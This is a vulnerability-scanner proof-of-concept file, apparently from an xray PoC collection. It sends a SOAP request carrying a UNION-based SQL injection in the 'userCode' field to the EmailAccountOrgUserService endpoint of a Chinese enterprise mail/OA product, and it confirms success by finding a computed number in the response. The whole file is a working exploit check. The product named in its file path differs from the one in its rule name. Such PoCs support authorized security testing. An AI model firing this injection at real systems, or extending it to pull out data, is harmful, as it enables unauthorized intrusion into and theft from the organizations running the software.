backend/utils/tools/xray_darwin_amd64/poc/chaitin/yaml-poc-glodon-linkworks-sql_injection-CT-821191.yml

name: poc-yaml-guangxuntong-emailaccountorguserservice-usercode-sqli
transport: http
set:
  s1: randomInt(10000, 99999)
  s2: randomInt(10000, 99999)
rules:
  r0:
    request:
      method: POST
      path: /Mail/Services/EmailAccountOrgUserService.asmx
      follow_redirects: false
      headers:
        Content-Type: text/xml; charset=utf-8
        SOAPAction: '"http://tempuri.org/GetUserIdByUserCode"'
      body: >-
        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xmlns:xsd="http://www.w3.org/2001/XMLSchema"
        xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <GetUserIdByUserCode xmlns="http://tempuri.org/">
              <userCode>aa') union select {{s1}}*{{s2}},2--</userCode>
            </GetUserIdByUserCode>
          </soap:Body>
        </soap:Envelope>
    expression: response.status == 200 && response.body_string.contains(string(s1 * s2))
expression: r0()
detail:
  author: 2husky
  links:
    - www.exploit-db.com